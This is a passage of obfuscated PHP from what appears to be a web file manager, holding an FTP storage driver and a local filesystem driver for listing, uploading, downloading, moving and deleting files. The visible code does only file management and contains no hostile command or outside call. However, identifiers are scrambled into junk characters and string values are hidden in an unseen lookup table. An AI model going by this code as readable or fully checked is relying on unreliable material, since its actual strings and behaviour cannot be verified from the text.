__construct($ß–Âë—ø) { parent::__construct(); if (count($ß–Âë—ø) > 0) { $this->_init($ß–Âë—ø); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($³“÷¾î¢) { $¶üÀ·Ü =& $_SERVER[ê‘³Æ±]; global $config; $this->appCharset = $config[$¶üÀ·Ü[1351]]; $this->systemCharset = $config[$¶üÀ·Ü[1352]]; if (isset($³“÷¾î¢[$¶üÀ·Ü[1353]]) && $³“÷¾î¢[$¶üÀ·Ü[1353]]) { $this->systemCharset = $³“÷¾î¢[$¶üÀ·Ü[1353]]; } } public function iconvApp($ÁšÑª«) { return $this->iconvTo($ÁšÑª«, $this->systemCharset, $this->appCharset); } public function iconvSystem($Œˆ’¶·) { return $this->iconvTo($Œˆ’¶·, $this->appCharset, $this->systemCharset); } public function getPathOuter($™»¼·¹) { $æ¬Ó¶í– =& $_SERVER[ê‘³Æ±]; $âˆ©İì = $this->iconvApp($this->pathBase); $™»¼·¹ = $this->iconvApp($™»¼·¹); if (substr($âˆ©İì, 0, 2) == $æ¬Ó¶í–[1354]) { $âˆ©İì = BASIC_PATH . substr($âˆ©İì, 2); } if (substr($™»¼·¹, 0, 2) == $æ¬Ó¶í–[1354]) { $™»¼·¹ = BASIC_PATH . substr($™»¼·¹, 2); } $âˆ©İì = KodIO::clear($âˆ©İì); $™»¼·¹ = KodIO::clear($™»¼·¹); $™»¼·¹ = substr($™»¼·¹, strlen($âˆ©İì)); if (empty($this->pathDriver)) { return $™»¼·¹; } return $this->pathDriver . $æ¬Ó¶í–[8] . ltrim($™»¼·¹, $æ¬Ó¶í–[8]); } private function _init($é³åäÄí = array()) { $ÈÁÌ òô =& $_SERVER[ê‘³Æ±]; if (!function_exists($ÈÁÌ òô[1355])) { throw new Exception(LNG($ÈÁÌ òô[1356])); } $this->config = $é³åäÄí; $this->charsetReset($é³åäÄí); foreach ($é³åäÄí as $¬‚–Øøû => $¥äÀå•Š) { if (isset($this->{$¬‚–Øøû})) { $this->{$¬‚–Øøû} = $¥äÀå•Š; } } return $this->_login($é³åäÄí); } private function _login($—É³Å°ñ) { $¸›ù÷‡¶ =& $_SERVER[ê‘³Æ±]; static $å“’öÃè = array(); $€¢¯“¡‡ = md5(json_encode($—É³Å°ñ)); if (isset($å“’öÃè[$€¢¯“¡‡])) { foreach ($å“’öÃè[$€¢¯“¡‡] as $¥·ÔÍûë => $—Âé¦ë) { $this->{$¥·ÔÍûë} = $—Âé¦ë; } return !0; } $ìê·®Õ‹ = parse_url(trim($this->server, $¸›ù÷‡¶[8])); $this->host = $ìê·®Õ‹[$¸›ù÷‡¶[176]]; $íñÛÃı¨ = isset($ìê·®Õ‹[$¸›ù÷‡¶[175]]) && $ìê·®Õ‹[$¸›ù÷‡¶[175]] == $¸›ù÷‡¶[1357] ? !0 : !1; $this->scheme = $íñÛÃı¨ ? $¸›ù÷‡¶[1358] : $¸›ù÷‡¶[1359]; $this->port = isset($ìê·®Õ‹[$¸›ù÷‡¶[177]]) ? $ìê·®Õ‹[$¸›ù÷‡¶[177]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $åÊÙÄÑÕ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Âì»—÷Û = $this->pasv == $¸›ù÷‡¶[89] ? !0 : !1; @ftp_pasv($this->connect, $Âì»—÷Û); $å“’öÃè[$€¢¯“¡‡] = array($¸›ù÷‡¶[1360] => $this->connect, $¸›ù÷‡¶[176] => $this->host, $¸›ù÷‡¶[175] => $this->scheme, $¸›ù÷‡¶[177] => $this->port); return $åÊÙÄÑÕ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($™¯à—œ©, $˜ÄÇ‚üÙ = '', $”½†î›“ = REPEAT_RENAME) { if ($this->setContent($™¯à—œ©, $˜ÄÇ‚üÙ)) { return $this->getPathOuter($™¯à—œ©); } return !1; } public function mkdir($¡‚¯², $éò­ Û€ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $¡‚¯² = $this->iconvSystem($¡‚¯²); if ($this->_isFolder($¡‚¯²) || @ftp_mkdir($this->connect, $¡‚¯²)) { return $this->getPathOuter($¡‚¯²); } if (!$this->mkdir($this->pathFather($¡‚¯²))) { return !1; } if ($¡‚¯² = @ftp_mkdir($this->connect, $¡‚¯²)) { return $this->getPathOuter($¡‚¯²); } return !1; } public function copyFile($§‡Ì€, $÷¤Ó€œÉ) { if (!$this->_isconn()) { return !1; } $Èá®à¡Ú = $this->pathThis($this->iconvSystem($§‡Ì€)); $à‘«ò¬§ = $this->tempFile($Èá®à¡Ú); $Û¼Åè· = $this->iconvApp($à‘«ò¬§); $this->download($§‡Ì€, $Û¼Åè·); $Û´ƒã = $this->upload($÷¤Ó€œÉ, $Û¼Åè·); $this->tempFileRemve($à‘«ò¬§); return $Û´ƒã; } public function moveFile($æáÕÆ¤Ñ, $¿“Ò„·Ö) { if (!$this->_isconn()) { return !1; } $æáÕÆ¤Ñ = $this->iconvSystem($æáÕÆ¤Ñ); $¿“Ò„·Ö = $this->iconvSystem($¿“Ò„·Ö); $®÷‰ó¿Ñ = @ftp_rename($this->connect, $æáÕÆ¤Ñ, $¿“Ò„·Ö); return $®÷‰ó¿Ñ ? $this->getPathOuter($¿“Ò„·Ö) : !1; } public function delFile($ü°÷à¨¹) { if (!$this->_isconn()) { return !1; } $ü°÷à¨¹ = $this->iconvSystem($ü°÷à¨¹); return @ftp_delete($this->connect, $ü°÷à¨¹); } public function delFolder($èÀ’àÁÖ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Ñ„ï™Æ¶ = $²ö—ª¼Ì = array(); $this->fileList($èÀ’àÁÖ, $Ñ„ï™Æ¶, $²ö—ª¼Ì, !0); $this->listItemCache = !0; foreach ($²ö—ª¼Ì as $¤Íùàóî) { $­®øå¢» = $this->iconvSystem($¤Íùàóî[$_SERVER[ê‘³Æ±][32]]); $“Š†§ã = @ftp_delete($this->connect, $­®øå¢»); if (!$“Š†§ã) { return !1; } } foreach ($Ñ„ï™Æ¶ as $­®øå¢») { $­®øå¢» = $this->iconvSystem($­®øå¢»); $“Š†§ã = @ftp_rmdir($this->connect, $­®øå¢»); if (!$“Š†§ã) { return !1; } } $èÀ’àÁÖ = $this->iconvSystem($èÀ’àÁÖ); return @ftp_rmdir($this->connect, $èÀ’àÁÖ); } public function rename($­öšøí”, $Ÿ¹Š»«é) { $ŠËÒ–í” =& $_SERVER[ê‘³Æ±]; if (!$this->_isconn()) { return !1; } $¯ ‡²¡Ó = $this->fileNameAuto($this->pathFather($­öšøí”), $Ÿ¹Š»«é); $¯ ‡²¡Ó = $this->iconvSystem($¯ ‡²¡Ó); $­öšøí” = $this->iconvSystem($­öšøí”); $¢º¨Ñ¡“ = $this->pathFather($­öšøí”); $•ë¿Ÿİã = rtrim($¢º¨Ñ¡“, $ŠËÒ–í”[8]) . $ŠËÒ–í”[8] . $¯ ‡²¡Ó; $­€¾šîÛ = @ftp_rename($this->connect, $­öšøí”, $•ë¿Ÿİã); $•ë¿Ÿİã = $this->iconvApp($•ë¿Ÿİã); return $­€¾šîÛ ? $this->getPathOuter($•ë¿Ÿİã) : !1; } private function folderInfo($•ëª„–¤, $Î´·Ÿš† = false) { $¦‡ŞÛñ =& $_SERVER[ê‘³Æ±]; $’ÖŠ„Êã = array($¦‡ŞÛñ[32] => $this->pathThis($•ëª„–¤), $¦‡ŞÛñ[78] => $this->getPathOuter($¦‡ŞÛñ[8] . $•ëª„–¤), $¦‡ŞÛñ[33] => $¦‡ŞÛñ[79]); if ($Î´·Ÿš†) { return $’ÖŠ„Êã; } $’ÖŠ„Êã[$¦‡ŞÛñ[195]] = $’ÖŠ„Êã[$¦‡ŞÛñ[86]] = 0; $’ÖŠ„Êã[$¦‡ŞÛñ[196]] = $’ÖŠ„Êã[$¦‡ŞÛñ[197]] = !0; return $’ÖŠ„Êã; } private function fileInfo($ıë –‘, $ü»ÅˆÍ† = false, $Ö´›¥ÁÓ = array()) { $¸İ³Õ» =& $_SERVER[ê‘³Æ±]; $‹Æ·Ã×¨ = array($¸İ³Õ»[32] => $this->pathThis($ıë –‘), $¸İ³Õ»[78] => $this->getPathOuter($¸İ³Õ»[8] . $ıë –‘), $¸İ³Õ»[33] => $¸İ³Õ»[194], $¸İ³Õ»[80] => isset($Ö´›¥ÁÓ[$¸İ³Õ»[80]]) ? $Ö´›¥ÁÓ[$¸İ³Õ»[80]] : 0, $¸İ³Õ»[169] => $this->ext($ıë –‘)); if ($ü»ÅˆÍ†) { return $‹Æ·Ã×¨; } $‹Æ·Ã×¨[$¸İ³Õ»[195]] = $‹Æ·Ã×¨[$¸İ³Õ»[86]] = 0; $‹Æ·Ã×¨[$¸İ³Õ»[196]] = $‹Æ·Ã×¨[$¸İ³Õ»[197]] = !0; $ÀÂ·¦Û× = $this->iconvSystem($ıë –‘); $‹Æ·Ã×¨[$¸İ³Õ»[86]] = @ftp_mdtm($this->connect, $ÀÂ·¦Û×); if (empty($Ö´›¥ÁÓ)) { $Ö´›¥ÁÓ = $this->objectMeta($ıë –‘); if (!$Ö´›¥ÁÓ) { return $‹Æ·Ã×¨; } } $‹Æ·Ã×¨[$¸İ³Õ»[80]] = $Ö´›¥ÁÓ[$¸İ³Õ»[80]]; return $‹Æ·Ã×¨; } public function size($àéàó³) { $ôÎÚ€ÂÆ = $this->objectMeta($àéàó³); return $ôÎÚ€ÂÆ ? $ôÎÚ€ÂÆ[$_SERVER[ê‘³Æ±][80]] : 0; } public function info($üê·† æ) { if ($this->isFile($üê·† æ)) { return $this->fileInfo($üê·† æ, 0); } else { if ($this->isFolder($üê·† æ)) { return $this->folderInfo($üê·† æ); } } return !1; } private function fileList($Ü¬•µÅ, &$Óî ×Âş, &$ŞâĞÇş¶, $ãõëÌíé = false) { $ß¢şîòû =& $_SERVER[ê‘³Æ±]; $Ü¬•µÅ = $this->iconvSystem($Ü¬•µÅ); if (!$this->isFolder($Ü¬•µÅ)) { return !1; } @ftp_chdir($this->connect, $ß¢şîòû[8]); $Ü¬•µÅ = rtrim($Ü¬•µÅ, $ß¢şîòû[8]) . $ß¢şîòû[8]; check_abort(); $ÃÔ•Ç¹Ë = $this->listItemCache === !1 ? !1 : !0; $Æ›‡ûÍÉ = @ftp_rawlist($this->connect, $Ü¬•µÅ); if (!$Æ›‡ûÍÉ) { $Æ›‡ûÍÉ = array(); } $¾¬ŠÄµë = array($ß¢şîòû[10] => 1, $ß¢şîòû[1361] => 1); foreach ($Æ›‡ûÍÉ as $ËˆÒŠß ) { $ïÊ§óÑœ = $this->_listItem($ËˆÒŠß ); if ($ïÊ§óÑœ[0] == $ß¢şîòû[745]) { continue; } $´ß¬¯›× = $ïÊ§óÑœ[8]; if (empty($´ß¬¯›×) && $´ß¬¯›× !== $ß¢şîòû[192] || isset($¾¬ŠÄµë[$´ß¬¯›×])) { continue; } $´ß¬¯›× = $this->iconvApp($Ü¬•µÅ . ltrim($´ß¬¯›×, $ß¢şîòû[8])); $ßÃµí²î = array($ß¢şîòû[32] => $´ß¬¯›×, $ß¢şîòû[33] => $ß¢şîòû[194], $ß¢şîòû[80] => $ïÊ§óÑœ[4]); if (substr($ËˆÒŠß , 0, 1) == $ß¢şîòû[1362]) { $ßÃµí²î[$ß¢şîòû[33]] = $ß¢şîòû[79]; $ßÃµí²î[$ß¢şîòû[80]] = 0; } $Ç¦æÜç¹ = $ßÃµí²î[$ß¢şîòû[33]] == $ß¢şîòû[79] ? !0 : !1; if ($ÃÔ•Ç¹Ë) { $this->cacheMethod($ß¢şîòû[200], $´ß¬¯›×, $Ç¦æÜç¹); $this->cacheMethod($ß¢şîòû[201], $´ß¬¯›×, $ßÃµí²î); } if ($Ç¦æÜç¹) { $Óî ×Âş[] = $´ß¬¯›×; if ($ãõëÌíé) { $this->fileList($´ß¬¯›×, $Óî ×Âş, $ŞâĞÇş¶, $ãõëÌíé); } continue; } $ŞâĞÇş¶[] = $ßÃµí²î; } if ($ÃÔ•Ç¹Ë) { $this->cacheMethod($ß¢şîòû[200], $Ü¬•µÅ, !0); } } private function _listItem($ºªß×æÃ) { if (empty($ºªß×æÃ)) { return array(); } $İ“¤¯ı° = preg_split($_SERVER[ê‘³Æ±][1363], $ºªß×æÃ); if (count($İ“¤¯ı°) <= 9) { return $İ“¤¯ı°; } $İ“¤¯ı°[8] = trim(substr($ºªß×æÃ, strpos($ºªß×æÃ, $İ“¤¯ı°[7]) + strlen($İ“¤¯ı°[7]))); return array_splice($İ“¤¯ı°, 0, 9); } public function listPath($Èš™ô›, $ıÃ ‰í = false) { $®ø—‚± =& $_SERVER[ê‘³Æ±]; if (!$this->_isconn()) { return !1; } $ÁøØ¡Ò» = $¿ª¸Â = array(); $this->fileList($Èš™ô›, $ÁøØ¡Ò», $¿ª¸Â); foreach ($ÁøØ¡Ò» as $ûåó´è· => $ŒœÌô¡—) { $ÁøØ¡Ò»[$ûåó´è·] = $this->folderInfo($ŒœÌô¡—, $ıÃ ‰í); } foreach ($¿ª¸Â as $ûåó´è· => $ŒœÌô¡—) { $¿ª¸Â[$ûåó´è·] = $this->fileInfo($ŒœÌô¡—[$®ø—‚±[32]], $ıÃ ‰í, $ŒœÌô¡—); } return array($®ø—‚±[77] => $ÁøØ¡Ò», $®ø—‚±[76] => $¿ª¸Â); } public function has($ãÉ¨Ÿ¨, $¢¼ºŒŒİ = false, $ÕøóÔäŠ = true) { $óÙú÷‡ğ =& $_SERVER[ê‘³Æ±]; $„éé‚° = $ò¦³§é = array(); $½‹îÓ˜‰ = $¢¼ºŒŒİ ? !0 : !1; $this->fileList($ãÉ¨Ÿ¨, $„éé‚°, $ò¦³§é, $½‹îÓ˜‰); if ($¢¼ºŒŒİ) { return array($óÙú÷‡ğ[204] => count($ò¦³§é), $óÙú÷‡ğ[205] => count($„éé‚°)); } if ($ÕøóÔäŠ) { if (count($ò¦³§é)) { return !0; } } else { if (count($„éé‚°)) { return !0; } } return !1; } public function listAll($à®…Úˆ) { $Š’±·” =& $_SERVER[ê‘³Æ±]; if (!$this->_isconn()) { return !1; } $‰Ê€û = $ô©î‹â = array(); $this->fileList($à®…Úˆ, $‰Ê€û, $ô©î‹â, !0); $ »Â´í = array(); foreach ($ô©î‹â as $¾í’‡Æ) { $ »Â´í[$¾í’‡Æ[$Š’±·”[32]]] = $¾í’‡Æ[$Š’±·”[80]]; } foreach ($‰Ê€û as $¾í’‡Æ) { if (is_string($¾í’‡Æ)) { $ »Â´í[$¾í’‡Æ] = 0; } } return $this->listAllFiles($à®…Úˆ, array_keys($ »Â´í), $ »Â´í); } public function getContent($ã¨ÚÂ—‹) { if (!$this->_isconn()) { return !1; } $ã¨ÚÂ—‹ = $this->iconvSystem($ã¨ÚÂ—‹); return $this->fileSubstr($ã¨ÚÂ—‹); } public function setContent($äÜÃ, $™’‘Ü·Ë = '') { if (!$this->_isconn()) { return !1; } $ÉåÌİñ… = $this->pathThis($this->iconvSystem($äÜÃ)); $ûòƒˆæ· = $this->tempFile($ÉåÌİñ…); file_put_contents($ûòƒˆæ·, $™’‘Ü·Ë); $¯Á©ò»× = $this->upload($äÜÃ, $this->iconvApp($ûòƒˆæ·)); $this->tempFileRemve($ûòƒˆæ·); return $¯Á©ò»×; } public function fileSubstr($²Ó²ú†Ğ, $Îª…ŸŞÈ = 0, $şô¹² = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($²Ó²ú†Ğ, $Îª…ŸŞÈ, $şô¹²); } private function ftpRequest($àüÑÌ¨¡, $üéòÌœ = 0, $¹øŞÅŒÑ = false) { $àüÑÌ¨¡ = $this->iconvSystem($àüÑÌ¨¡); $©•ù–üÇ = $this->scheme . $this->host . $_SERVER[ê‘³Æ±][4] . $this->port; $åÙæï¶ = curl_init(); curl_setopt($åÙæï¶, CURLOPT_URL, $©•ù–üÇ . $this->pathEncode($àüÑÌ¨¡)); curl_setopt($åÙæï¶, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($¹øŞÅŒÑ) { $Ì©Ê¤éğ = $üéòÌœ + $¹øŞÅŒÑ - 1; curl_setopt($åÙæï¶, CURLOPT_RANGE, "{$üéòÌœ}\55{$Ì©Ê¤éğ}"); } curl_setopt($åÙæï¶, CURLOPT_RETURNTRANSFER, 1); $ûÀÊã¯Ê = curl_exec($åÙæï¶); curl_close($åÙæï¶); return $ûÀÊã¯Ê; } public function upload($ïØ¬Ú©¬, $³ ê‰ãÅ, $ ƒª¯µ¸ = false, $š›è­© = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ïØ¬Ú©¬))) { return !1; } $ïØ¬Ú©¬ = $this->iconvSystem($ïØ¬Ú©¬); $³ ê‰ãÅ = $this->iconvSystem($³ ê‰ãÅ); $¡æÅ¼¸Ò = ftp_nb_put($this->connect, $ïØ¬Ú©¬, $³ ê‰ãÅ, FTP_BINARY); while ($¡æÅ¼¸Ò == FTP_MOREDATA) { $¡æÅ¼¸Ò = ftp_nb_continue($this->connect); } if ($¡æÅ¼¸Ò != FTP_FINISHED) { return !1; } return $this->getPathOuter($ïØ¬Ú©¬); } public function download($û•ÉİÚ“, $ïûÀÈ¨œ = '') { if (!$this->_isconn()) { return !1; } $ü¯¥±áô = $this->pathFather($ïûÀÈ¨œ); if (!IO::mkdir($ü¯¥±áô)) { return !1; } $û•ÉİÚ“ = $this->iconvSystem($û•ÉİÚ“); $ïûÀÈ¨œ = $this->iconvSystem($ïûÀÈ¨œ); $æËÏ´æ = ftp_nb_get($this->connect, $ïûÀÈ¨œ, $û•ÉİÚ“, FTP_BINARY); while ($æËÏ´æ == FTP_MOREDATA) { $æËÏ´æ = ftp_nb_continue($this->connect); } if ($æËÏ´æ != FTP_FINISHED) { return !1; } return $this->iconvApp($ïûÀÈ¨œ); } public function exist($Î¬©¨¼Ô) { return $this->isFile($Î¬©¨¼Ô) || $this->isFolder($Î¬©¨¼Ô); } public function isFile($ØóÔË©) { return !$this->isFolder($ØóÔË©) && $this->objectMeta($ØóÔË©); } public function isFolder($°æÛœú) { return $this->cacheMethod($_SERVER[ê‘³Æ±][200], $°æÛœú); } protected function objectMeta($øªõ»¶Ñ) { return $this->cacheMethod($_SERVER[ê‘³Æ±][201], $øªõ»¶Ñ); } protected function _objectMeta($×ØÇ»ŞÄ) { $¸Ñ‘†ñ =& $_SERVER[ê‘³Æ±]; if ($×ØÇ»ŞÄ == $¸Ñ‘†ñ[12] || $×ØÇ»ŞÄ == $¸Ñ‘†ñ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $×ØÇ»ŞÄ = $this->iconvSystem($×ØÇ»ŞÄ); $ëËõ´ÔØ = array($¸Ñ‘†ñ[32] => $this->iconvApp($×ØÇ»ŞÄ), $¸Ñ‘†ñ[33] => $¸Ñ‘†ñ[194], $¸Ñ‘†ñ[80] => 0); @ftp_chdir($this->connect, $¸Ñ‘†ñ[8]); $àÔ”¿×ï = @ftp_size($this->connect, $×ØÇ»ŞÄ); if ($àÔ”¿×ï != -1) { $ëËõ´ÔØ[$¸Ñ‘†ñ[80]] = $àÔ”¿×ï; } else { $Ä·Ú†é = @ftp_chdir($this->connect, $×ØÇ»ŞÄ); if (!$Ä·Ú†é) { return !1; } $ëËõ´ÔØ[$¸Ñ‘†ñ[33]] = $¸Ñ‘†ñ[79]; } return $ëËõ´ÔØ; } protected function _isFolder($ĞãäÂ™–) { $ñüÂ„œÅ =& $_SERVER[ê‘³Æ±]; if ($ĞãäÂ™– == $ñüÂ„œÅ[12] || $ĞãäÂ™– == $ñüÂ„œÅ[8]) { return !0; } $¨á£Ìƒ = $this->_objectMeta($ĞãäÂ™–); return isset($¨á£Ìƒ[$ñüÂ„œÅ[33]]) && $¨á£Ìƒ[$ñüÂ„œÅ[33]] == $ñüÂ„œÅ[79] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($¢ò˜¶ğò) { if (substr($¢ò˜¶ğò, 0, 2) == $_SERVER[ê‘³Æ±][1354]) { $¢ò˜¶ğò = BASIC_PATH . substr($¢ò˜¶ğò, 2); } return $¢ò˜¶ğò; } public function iconvApp($°âí„„ø) { $¡ÖõÌÍÚ =& $_SERVER[ê‘³Æ±]; global $config; return $this->iconvTo($°âí„„ø, $config[$¡ÖõÌÍÚ[1352]], $config[$¡ÖõÌÍÚ[1351]]); } public function iconvSystem($¢åÛğÅ) { $‹²¢îã =& $_SERVER[ê‘³Æ±]; global $config; return $this->iconvTo($¢åÛğÅ, $config[$‹²¢îã[1351]], $config[$‹²¢îã[1352]]); } public function getPathOuter($»æŒ¶»®) { $ ‘ŞÃÏ¸ =& $_SERVER[ê‘³Æ±]; $»ˆè—Ã = $this->iconvApp($this->pathBase); $»æŒ¶»® = $this->iconvApp($»æŒ¶»®); if (substr($»ˆè—Ã, 0, 2) == $ ‘ŞÃÏ¸[1354]) { $»ˆè—Ã = BASIC_PATH . substr($»ˆè—Ã, 2); } if (substr($»æŒ¶»®, 0, 2) == $ ‘ŞÃÏ¸[1354]) { $»æŒ¶»® = BASIC_PATH . substr($»æŒ¶»®, 2); } $»ˆè—Ã = KodIO::clear($»ˆè—Ã); $»æŒ¶»® = KodIO::clear($»æŒ¶»®); $»æŒ¶»® = substr($»æŒ¶»®, strlen($»ˆè—Ã)); if (empty($this->pathDriver)) { return $»æŒ¶»®; } return $this->pathDriver . $ ‘ŞÃÏ¸[8] . ltrim($»æŒ¶»®, $ ‘ŞÃÏ¸[8]); } public function mkfile($“Óı—ß, $Êì‡Ş·Î = '', $øÜ£Œèš = REPEAT_RENAME) { $“Óı—ß = $this->iconvSystem($“Óı—ß); @touch($“Óı—ß); if ($Êì‡Ş·Î) { file_put_contents($“Óı—ß, $Êì‡Ş·Î); } @chmod($“Óı—ß, $this->pathAuth); return is_file($“Óı—ß) ? $this->getPathOuter($“Óı—ß) : !1; } public function mkdir($œ²‘ ¬€, $³Ğôúš = REPEAT_SKIP) { $œ²‘ ¬€ = $this->iconvSystem($œ²‘ ¬€); if (is_dir($œ²‘ ¬€)) { return $this->getPathOuter($œ²‘ ¬€); } @mkdir($œ²‘ ¬€, $this->pathAuth, !0); @chmod($œ²‘ ¬€, $this->pathAuth); return is_dir($œ²‘ ¬€) ? $this->getPathOuter($œ²‘ ¬€) : !1; } public function copyFile($£¶’¿µ÷, $è¢±ã¯) { $this->mkdir($this->pathFather($è¢±ã¯)); $£¶’¿µ÷ = $this->iconvSystem($£¶’¿µ÷); $è¢±ã¯ = $this->iconvSystem($è¢±ã¯); $õœ¥¢ƒí = copy_64($£¶’¿µ÷, $è¢±ã¯); @chmod($è¢±ã¯, $this->pathAuth); return $õœ¥¢ƒí ? $this->getPathOuter($è¢±ã¯) : !1; } public function moveFile($¾ÅÕÃ°ñ, $šÀ¥Áç) { $this->mkdir($this->pathFather($šÀ¥Áç)); $¾ÅÕÃ°ñ = $this->iconvSystem($¾ÅÕÃ°ñ); $šÀ¥Áç = $this->iconvSystem($šÀ¥Áç); $ü²”‘ÇË = intval(@rename($¾ÅÕÃ°ñ, $šÀ¥Áç)); if (!$ü²”‘ÇË) { if ($ü²”‘ÇË = intval(@copy_64($¾ÅÕÃ°ñ, $šÀ¥Áç))) { @unlink($¾ÅÕÃ°ñ); } } @chmod($šÀ¥Áç, $this->pathAuth); return $ü²”‘ÇË ? $this->getPathOuter($šÀ¥Áç) : !1; } public function movePath($¾Ä­ƒÏå, $Ÿı‰şˆŸ, $óå¸£·— = false) { $ĞœÀ‘îª =& $_SERVER[ê‘³Æ±]; $¾Ä­ƒÏå = $this->iconvSystem($¾Ä­ƒÏå); $Ÿı‰şˆŸ = $this->iconvSystem($Ÿı‰şˆŸ); $ƒ°ÄÕş = rtrim($Ÿı‰şˆŸ, $ĞœÀ‘îª[8]) . $ĞœÀ‘îª[8] . ($óå¸£·— ? $óå¸£·— : get_path_this($¾Ä­ƒÏå)); if (file_exists($ƒ°ÄÕş)) { return !1; } $˜ı”Ï¡¬ = intval(@rename($¾Ä­ƒÏå, $ƒ°ÄÕş)); $˜ı”Ï¡¬ = file_exists($ƒ°ÄÕş); return $˜ı”Ï¡¬ ? $this->getPathOuter($ƒ°ÄÕş) : !1; } public function delFile($ú“Ùªµ½) { $ú“Ùªµ½ = $this->iconvSystem($ú“Ùªµ½); if (!@unlink($ú“Ùªµ½)) { @chmod($ú“Ùªµ½, $this->pathAuth); if (!@unlink($ú“Ùªµ½)) { return !1; } } else { return !0; } } public function delFolder($×”Åô‚) { $½šÂ®¢ =& $_SERVER[ê‘³Æ±]; $×”Åô‚ = $this->iconvSystem($×”Åô‚); if (!is_dir($×”Åô‚)) { return !0; } if (!($óñÏìì§ = opendir($×”Åô‚))) { return !1; } while (($á‹ÖªŠÌ = readdir($óñÏìì§)) !== !1) { if ($á‹ÖªŠÌ == $½šÂ®¢[10] || $á‹ÖªŠÌ == $½šÂ®¢[1361]) { continue; } $±«Û™ß¸ = $×”Åô‚ . $½šÂ®¢[8] . $á‹ÖªŠÌ; if (is_file($±«Û™ß¸) || is_link($±«Û™ß¸)) { if (!unlink($±«Û™ß¸)) { chmod($±«Û™ß¸, $this->pathAuth); if (!unlink($±«Û™ß¸)) { return !1; } } } else { if (is_dir($±«Û™ß¸)) { chmod($±«Û™ß¸, $this->pathAuth); $±«Û™ß¸ = $this->iconvApp($±«Û™ß¸); if (!$this->delFolder($±«Û™ß¸)) { return !1; } } } } closedir($óñÏìì§); return rmdir($×”Åô‚); } public function rename($¬î¦çŸ, $•«¥Ôñè) { $­úë‚Ş =& $_SERVER[ê‘³Æ±]; $ª•Ï¼Ä = $this->fileNameAuto($this->pathFather($¬î¦çŸ), $•«¥Ôñè); $ª•Ï¼Ä = $this->iconvSystem($ª•Ï¼Ä); $¬î¦çŸ = $this->iconvSystem($¬î¦çŸ); $‹ÄÀæÏ = $this->pathFather($¬î¦çŸ); $²ºñ™˜… = rtrim($‹ÄÀæÏ, $­úë‚Ş[8]) . $­úë‚Ş[8] . $ª•Ï¼Ä; $—”ò¸ = @rename($¬î¦çŸ, $²ºñ™˜…); $²ºñ™˜… = $this->iconvApp($²ºñ™˜…); return $—”ò¸ ? $this->getPathOuter($²ºñ™˜…) : !1; } public function size($è¼õçş) { $è¼õçş = $this->iconvSystem($è¼õçş); return filesize_64($è¼õçş); } public function info($õƒ»æ‘Ï) { $õƒ»æ‘Ï = $this->iconvSystem($õƒ»æ‘Ï); if ($this->isFolder($õƒ»æ‘Ï)) { return $this->folderInfo($õƒ»æ‘Ï); } else { if ($this->isFile($õƒ»æ‘Ï)) { return $this->fileInfo($õƒ»æ‘Ï); } } return !1; } protected function infoChildren($øÆãÃ, &$ôõóæ§´, $¨¡õ¹ûë = true) { $ŠÒåÒ­¨ =& $_SERVER[ê‘³Æ±]; check_abort_echo(); $øÆãÃ = rtrim($øÆãÃ, $ŠÒåÒ­¨[8]) . $ŠÒåÒ­¨[8]; if ($¨¡õ¹ûë) { $øÆãÃ = $this->iconvSystem($øÆãÃ); } if (!($Í±ªòÏ“ = @opendir($øÆãÃ))) { return; } while (($±¶Ùç¡ö = readdir($Í±ªòÏ“)) !== !1) { if ($±¶Ùç¡ö == $ŠÒåÒ­¨[10] || $±¶Ùç¡ö == $ŠÒåÒ­¨[1361]) { continue; } $±Î÷‚»‹ = $øÆãÃ . $±¶Ùç¡ö; if (is_file($±Î÷‚»‹) || is_link($±Î÷‚»‹)) { $ôõóæ§´[$ŠÒåÒ­¨[81]]++; $ôõóæ§´[$ŠÒåÒ­¨[80]] += filesize_64($±Î÷‚»‹); } else { if (is_dir($±Î÷‚»‹)) { $ôõóæ§´[$ŠÒåÒ­¨[82]]++; $this->infoChildren($±Î÷‚»‹, $ôõóæ§´, !1); } } } closedir($Í±ªòÏ“); } private function folderInfo($ßÄ´¡¼, $Æó›¨¬ = false) { $ÓŸ·¢Ÿ¾ =& $_SERVER[ê‘³Æ±]; $ßÄ´¡¼ = rtrim($ßÄ´¡¼, $ÓŸ·¢Ÿ¾[8]) . $ÓŸ·¢Ÿ¾[8]; $Ûƒû¡è = $this->iconvApp($this->pathThis($ßÄ´¡¼)); if ($Æó›¨¬) { return array($ÓŸ·¢Ÿ¾[32] => $Ûƒû¡è, $ÓŸ·¢Ÿ¾[78] => $this->getPathOuter($ßÄ´¡¼), $ÓŸ·¢Ÿ¾[33] => $ÓŸ·¢Ÿ¾[79]); } $Ïñ„†• = array($ÓŸ·¢Ÿ¾[32] => $Ûƒû¡è, $ÓŸ·¢Ÿ¾[78] => $this->getPathOuter($ßÄ´¡¼), $ÓŸ·¢Ÿ¾[33] => $ÓŸ·¢Ÿ¾[79], $ÓŸ·¢Ÿ¾[195] => @filectime($ßÄ´¡¼), $ÓŸ·¢Ÿ¾[86] => @filemtime($ßÄ´¡¼), $ÓŸ·¢Ÿ¾[1364] => @fileatime($ßÄ´¡¼), $ÓŸ·¢Ÿ¾[1365] => is_readable($ßÄ´¡¼), $ÓŸ·¢Ÿ¾[1366] => is_writable($ßÄ´¡¼), $ÓŸ·¢Ÿ¾[1367] => get_mode($ßÄ´¡¼)); return $Ïñ„†•; } private function fileInfo($¼‘ÎÅÃÛ, $ ¶˜ù = false) { $”·ëàĞš =& $_SERVER[ê‘³Æ±]; $®éàÊ•´ = $this->iconvApp($this->pathThis($¼‘ÎÅÃÛ)); if ($ ¶˜ù) { return array($”·ëàĞš[32] => $®éàÊ•´, $”·ëàĞš[78] => 